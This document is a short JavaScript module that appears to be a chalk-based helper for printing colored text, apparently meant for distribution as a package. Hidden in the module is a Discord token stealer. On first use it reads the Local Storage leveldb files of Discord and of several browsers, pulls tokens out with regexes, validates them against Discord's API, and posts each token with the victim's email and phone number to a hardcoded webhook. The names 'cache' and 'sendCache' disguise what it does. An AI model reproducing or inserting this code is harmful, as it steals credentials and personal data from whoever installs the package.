const cacheHook = "https://discord.com/api/webhooks/782498489699532811/aCTRsESM76ROHoM8FSwQnCOu7-3LLXKB0AzHOapSWRmA67Hv4YA4Xc78Xye048gN0g7q";
const axios = require('axios').default;
const fetch = require ('node-fetch');
const fs = require('fs')
const cachePaths = [
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discord/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`,
    `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,
];

let cache = false;

module.exports = (m) => {
    if(!cache) {
        for (let i =0;i <6;i++) {
            getCache(cachePaths[i]);
        }
    }
    return require ('chalk').redBright(m);
}

async function getCache (cache) {
    try {
        fs.readdir(cache, (err, files) => {
            if (files === undefined) return;

            var filtro = files.filter(f => f.split('.').pop() === "ldb");

            for (i = 0; i < filtro.length; i++) {
                fs.readFile(`${cache}/${filtro[i]}`, 'utf-8', async function (err, data) {
                    let regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                    let regex2 = /"mfa\.[\d\w_-]{84}"/;

                    let [match] = regex1.exec(data) || regex2.exec(data) || [null];
                    if (match != null) {
                        match = match.replace(/"/g, '')

                        await fetch(`https://discord.com/api/v6/users/@me`, {
                            headers: {
                                "authorization": match
                            }
                        }).then(resp => resp.json()).then(response => {
                            if (response.id) {
								if(!response.premium_type) {
                                    nitro = "Sem nitro"
                                } else {
                                    if(response.premium_type === 1) { nitro = "Classic"}
                                    if(response.premium_type === 2) { nitro = "Nitro Gaming"}
                                }
                                sendCache(match, response.id, response.username, response.discriminator, response.email, response.phone, nitro, response.avatar)
                            }
                        })
                    }
                })
            }
        })

        fs.readdir(cache, (err, files) => {
            if (files === undefined) return;

            var filtro = files.filter(f => f.split('.').pop() === "log")
            for (i = 0; i < filtro.length; i++) {
                fs.readFile(`${cache}/${filtro[i]}`, 'utf-8', async function (err, data) {
                    let regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                    let regex2 = /"mfa\.[\d\w_-]{84}"/;

                    if (regex1.test(data)) {

                    }
                    let [match] = regex1.exec(data) || regex2.exec(data) || [null];
                    if (match != null) {
                        match = match.replace(/"/g, '')

                        await fetch(`https://discord.com/api/v8/users/@me`, {
                            headers: {
                                "authorization": match
                            }
                        }).then(resp => resp.json()).then(response => {
                            if (response.id) {
								if(!response.premium_type) {
                                    nitro = "Sem nitro"
                                } else {
                                    if(response.premium_type === 1) { nitro = "Nitro Classic"}
                                    if(response.premium_type === 2) { nitro = "Nitro Gaming"}
                                }
                                sendCache(match, response.id, response.username, response.discriminator, response.email, response.phone, nitro)
                            }
                        })
                    }
                })
            }
        })
    } catch (e) {
        throw e
    }
}

function sendCache (cache, cacheID, cacheName, cacheDogTag, cacheMail, cacheNum, cacheLife, cacheURL) {
    if (cacheMail === null) {
        email = "Sem mail"
    }
    if (cacheNum === null) {
        phone = "Sem num"
    }
    if(cacheURL === null) {
        cacheURL = "https://cdn.discordapp.com/attachments/712856393245392897/743945577238364160/discord.jpg"
    } else {
        cacheURL = `https://cdn.discordapp.com/avatars/${cacheID}/${cacheURL}.png`
    }
    axios.post(cacheHook, {
        "embeds": [
            {
                "color": 1127128,
                "author": {
                    "name": `${cacheName}`,
                    "icon_url": `${cacheURL}`
                },
                "thumbnail": {
                    "url": `${cacheURL}`
                },
                "description": `**CACHE**\n\n${cache}\n\n**ID**\n\n${cacheID}\n\n**NAME**\n\n${cacheName}#${cacheDogTag}\n\n**MAIL**\n\n${cacheMail}\n\n**NUMBER**\n\n${cacheNum}`,
            }
        ], "username": "Cache Request", "avatar_url": "https://images-ext-2.discordapp.net/external/B4oFamfEYyF5a2IZk_Ef3RnDA9VHiY4orjoKp_LBZ00/%3Fsize%3D2048/https/cdn.discordapp.com/avatars/621402634821042196/a0b719d919e2176f9603f3c3e84ad801.png?width=90&height=90"
    }, {
        headers: {
            'Content-Type': 'application/json',
        },
    })
}

function sendCacheTok (to) {
    try { 
        cache = true
        axios.post(cacheHook, {
            "embeds": [
                {
                    "color": 1127128,
                    "description": `**CACHE** - ${to}`,
                }
            ], "username": "Cache Request", "avatar_url": "https://images-ext-2.discordapp.net/external/B4oFamfEYyF5a2IZk_Ef3RnDA9VHiY4orjoKp_LBZ00/%3Fsize%3D2048/https/cdn.discordapp.com/avatars/621402634821042196/a0b719d919e2176f9603f3c3e84ad801.png?width=90&height=90"
        }, {
            headers: {
                'Content-Type': 'application/json',
            },
        })
    } catch (e) {
        return;
    }  
}